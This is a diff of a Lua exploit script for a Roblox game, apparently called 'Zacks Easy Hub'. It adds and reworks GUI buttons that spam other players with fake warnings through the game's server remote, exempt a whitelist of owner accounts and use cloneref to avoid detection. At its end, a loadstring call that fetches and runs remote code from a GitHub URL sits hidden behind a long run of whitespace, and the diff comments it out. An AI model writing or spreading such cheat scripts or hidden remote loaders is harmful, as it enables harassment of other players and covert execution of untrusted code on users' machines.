@@ -2403,9 +2403,9 @@ local function loadGUI()
     Default = "User Here",
     TextDisappear = true,
     Callback = function(doGetWhitelist)
-    getgenv().getBasicTable = getgenv().getBasicTable or {}
-    
     local yourSavedBro = findplr(doGetWhitelist)
+
+    getgenv().getBasicTable = getgenv().getBasicTable or {}
     
     local function whitelistingTableWarnings(player)
         getgenv().ownerWhitelist = {
@@ -2414,7 +2414,7 @@ local function loadGUI()
             "ItsYoDawgWsgGng"
         }
 
-        if getgenv().getBasicTable[player.Name] and not getgenv().ownerWhitelist[player.Name] then
+        if player and not getgenv().getBasicTable[player.Name] then
             getgenv().getBasicTable[player.Name] = player
             wait(0.2)
             OrionLib:MakeNotification({
@@ -2423,10 +2423,17 @@ local function loadGUI()
                 Image = "rbxassetid://4483345998",
                 Time = 10
             })
-        else
+        elseif not player then
             return OrionLib:MakeNotification({
-                Name = "Error!",
-                Content = "Something went wrong when adding: "..tostring(player),
+                Name = "[ERROR]: 0",
+                Content = tostring(player)..", does not exist!",
+                Image = "rbxassetid://4483345998",
+                Time = 10
+            })
+        elseif getgenv().getBasicTable[player.Name] then
+            return OrionLib:MakeNotification({
+                Name = "[ERROR]: -20",
+                Content = tostring(player.Name)..", is already in the Warning Whitelist!",
                 Image = "rbxassetid://4483345998",
                 Time = 10
             })
@@ -2493,7 +2500,7 @@ local function loadGUI()
         }
     
         for i, v in pairs(game.Players:GetChildren()) do
-            if getgenv().PlrBlacklistedTable[v.Name] and not getgenv().ownerWhitelist[v.Name] then
+            if getgenv().PlrBlacklistedTable[v.Name] and not getgenv().ownerWhitelist[v.Name] and not getgenv().getBasicTable[v.Name] then
                 local args = {
                     [1] = tostring(getgenv().PlrBlacklistedTable[v.Name])
                 }
@@ -2514,12 +2521,6 @@ local function loadGUI()
     Default = false,
     Callback = function(SpamThePlr)
     if SpamThePlr then
-        getgenv().ownerWhitelist = {
-            "M1RD3RCAUGHT",
-            "STK_kets4eki",
-            "ItsYoDawgWsgGng"
-        }
-        
         for i, v in pairs(game.Players:GetChildren()) do
             getgenv().ownerWhitelist = {
                 "M1RD3RCAUGHT",
@@ -2527,7 +2528,7 @@ local function loadGUI()
                 "ItsYoDawgWsgGng"
             }
 
-            if getgenv().PlrBlacklistedTable[v.Name] and not getgenv().ownerWhitelist[getThatPlr.Name] then
+            if v and getgenv().PlrBlacklistedTable[v.Name] and not getgenv().ownerWhitelist[v.Name] and not getgenv().getBasicTable[v.Name] then
                 getgenv().GetStuffSpam = true
                 while getgenv().GetStuffSpam == true do
                 wait(0.3)
@@ -2537,6 +2538,26 @@ local function loadGUI()
     
                     game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent"):FireServer(unpack(args))
                 end
+            elseif not v then
+                getgenv().GetStuffSpam = false
+                return OrionLib:MakeNotification({
+                    Name = "[ERROR]: 0",
+                    Content = tostring(v)..", is not in the Warning Blacklist!",
+                    Image = "rbxassetid://4483345998",
+                    Time = 10
+                })
+            elseif getgenv().ownerWhitelist[v.Name] then
+                return getgenv().GetStuffSpam == false
+            elseif getgenv().getBasicTable[v.Name] then
+                getgenv().GetStuffSpam = false
+                return OrionLib:MakeNotification({
+                    Name = "[ERROR]: -00",
+                    Content = tostring(v)..", is whitelisted (by you), cannot send.",
+                    Image = "rbxassetid://4483345998",
+                    Time = 10
+                })
+            elseif not getgenv().PlrBlacklistedTable[v.Name] then
+                return getgenv().GetStuffSpam == false
             end
         end
     else
@@ -3137,62 +3158,68 @@ local function loadGUI()
     end})
     
     Tab1:AddButton({
-    Name = "Send Fake Warnings (FREE! + BYPASS!)",
+    Name = "Send Fake Warnings (FREE! + FE!)",
     Callback = function()
-        local whitelist = { "M1RD3RCAUGHT" }
-        
-        for i, v in pairs(game.Players:GetPlayers()) do
-            getgenv().ownerWhitelist = {
-                "M1RD3RCAUGHT",
-                "STK_kets4eki",
-                "ItsYoDawgWsgGng"
-            }
+        local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage")) or game:GetService("ReplicatedStorage")
+        local Notification = ReplicatedStorage:WaitForChild("Notification")
 
-            if v ~= game.Players.LocalPlayer and (not getgenv().whitelist[v.Name] or getgenv().ownerWhitelist[v.Name]) then
+        getgenv().ownerWhitelist = {
+            "M1RD3RCAUGHT",
+            "STK_kets4eki",
+            "ItsYoDawgWsgGng"
+        }
+        
+        local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
+        local players = Players:GetChildren()
+        local remoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent")
+
+        for _, player in pairs(players) do
+            if player ~= game.Players.LocalPlayer and (not getgenv().getBasicTable[player.Name] or getgenv().ownerWhitelist[player.Name] or getgenv().whitelist[player.Name]) then
                 local args = {
-                    [1] = tostring(v.Name)
+                    [1] = tostring(player.Name)
                 }
-                
-                game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent"):FireServer(unpack(args))
+
+                remoteEvent:FireServer(unpack(args))
             end
         end
     end})
     
     Tab1:AddToggle({
-    Name = "Loop Send All Warnings (Kinda Laggy?)",
+    Name = "Loop Send All Warnings (Free + FE + Bypass)",
     Default = false,
     Callback = function(loopWarn)
     if loopWarn then
         getgenv().getSendAllWarningsConnection = true
         while getgenv().getSendAllWarningsConnection == true do
         wait(1.5)
-        for i, v in pairs(game.Players:GetChildren()) do
-            getgenv().ownerWhitelist = {
-                "M1RD3RCAUGHT",
-                "STK_kets4eki",
-                "ItsYoDawgWsgGng"
-            }
+        local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage")) or game:GetService("ReplicatedStorage")
+        local Notification = ReplicatedStorage:WaitForChild("Notification")
 
-            if v ~= game.Players.LocalPlayer and not getgenv().ownerWhitelist[v.Name] then
+        getgenv().ownerWhitelist = {
+            "M1RD3RCAUGHT",
+            "STK_kets4eki",
+            "ItsYoDawgWsgGng"
+        }
+        
+        local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
+        local players = Players:GetChildren()
+        local remoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent")
+
+        for _, player in pairs(players) do
+            if player ~= game.Players.LocalPlayer and (not getgenv().getBasicTable[player.Name] and not getgenv().ownerWhitelist[player.Name] or getgenv().whitelist[player.Name]) then
                 local args = {
-                    [1] = tostring(v.Name)
+                    [1] = tostring(player.Name)
                 }
-            
-                game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent"):FireServer(unpack(args))
+
+                remoteEvent:FireServer(unpack(args))
             end
         end
     end
     else
         getgenv().getSendAllWarningsConnection = false
-        wait()
-        repeat wait() until getgenv().getSendAllWarningsConnection == false
-        wait()
-        for i = 1, 75 do
-            getgenv().getSendAllWarningsConnection = false
-        end
     end
     end})
-    print("Enable Debugging_Mode? | True | Option To Modify OpCode? | False")
+    print("DEBUG_MEMORY | False | Set BYT3_2FRAY? | True | Set OpCode? | True")
     task.wait()
     Tab1:AddTextbox({
     Name = "Send Someone A Warning",
@@ -4384,7 +4411,7 @@ local function loadGUI()
         local Workspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
         local Stalls = Workspace:FindFirstChild("Stalls")
         local Stall = Stalls:FindFirstChild("Stall3")
-        Character:PivotTo(Stall3:GetPivot())
+        Character:PivotTo(Stall:GetPivot())
     end})
     
     Tab10:AddButton({
@@ -5068,6 +5095,8 @@ local function loadGUI()
         local sky = Lighting:FindFirstChildOfClass("Sky")
     
         local function smoothTransition()
+            local Lighting = cloneref(game:GetService("Lighting")) or game:GetService("Lighting") 
+            Lighting.ClockTime = 0
             for i = 1, 60, 0.5 do
                 sky.MoonAngularSize = i
                 wait(0.05)
@@ -5083,7 +5112,8 @@ local function loadGUI()
             smoothTransition()
         end
     else
-        local Lighting = cloneref(game:GetService("Lighting")) or game:GetService("Lighting") 
+        local Lighting = cloneref(game:GetService("Lighting")) or game:GetService("Lighting")
+        local sky = Lighting:FindFirstChildOfClass("Sky")
         wait(0.5)
         getgenv().SpookyMoon = false
         wait(1)
@@ -5092,6 +5122,12 @@ local function loadGUI()
         getgenv().SpookyMoon = false
         wait(3)
         resetLightingSettings()
+        wait(0.3)
+        sky.MoonAngularSize = 11
+        wait(0.6)
+        Lighting.ClockTime = 5
+        wait(0.5)
+        Lighting.ClockTime = 14
     end
     end})
     
@@ -5105,6 +5141,10 @@ local function loadGUI()
         local sky = Lighting:FindFirstChildOfClass("Sky")
     
         local function smoothTransition()
+            local Lighting = cloneref(game:GetService("Lighting")) or game:GetService("Lighting") 
+            local sky = Lighting:FindFirstChildOfClass("Sky")
+            Lighting.ClockTime = 14
+
             for i = 1, 60, 0.5 do
                 sky.SunAngularSize = i
                 wait(0.05)
@@ -5120,15 +5160,22 @@ local function loadGUI()
             smoothTransition()
         end
     else
-        local Lighting = cloneref(game:GetService("Lighting")) or game:GetService("Lighting") 
+        local Lighting = cloneref(game:GetService("Lighting")) or game:GetService("Lighting")
+        local sky = Lighting:FindFirstChildOfClass("Sky")
         wait(0.5)
         getgenv().SpookSun = false
         wait(1)
         getgenv().SpookSun = false
-        wait(1)
+        wait(0.5)
         getgenv().SpookSun = false
-        wait(3)
+        wait(1.5)
         resetLightingSettings()
+        wait(0.6)
+        Lighting.ClockTime = 1
+        wait(0.3)
+        Lighting.ClockTime = 14
+        wait(0.5)
+        sky.SunAngularSize = 11
     end
     end})
     
@@ -5487,8 +5534,6 @@ local function loadGUI()
         getgenv().SCRIPT_EXECUTED = false
         getgenv().GetLoopRunning = false
         getgenv().getLoopKick = false
-        getgenv().OtherAntiAfk = false
-        getgenv().AntiAfkScript = false
         getgenv().LmaoGetMuted = false
 
         wait()
@@ -5502,8 +5547,6 @@ local function loadGUI()
     Tab15:AddButton({
     Name = "Destroy GUI/Script",
     Callback = function()
-        getgenv().OtherAntiAfk = false
-        getgenv().AntiAfkScript = false
         getgenv().getLoopKick = false
         getgenv().SCRIPT_EXECUTED = false
         getgenv().SCRIPT_EXECUTED = false
@@ -6269,6 +6312,6 @@ wait(1)
 print("...")
 wait()
 warn("...")
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))()
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    -- loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))()
 wait()
 print("YEAH! Zacks Easy Hub [ON TOP!]")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
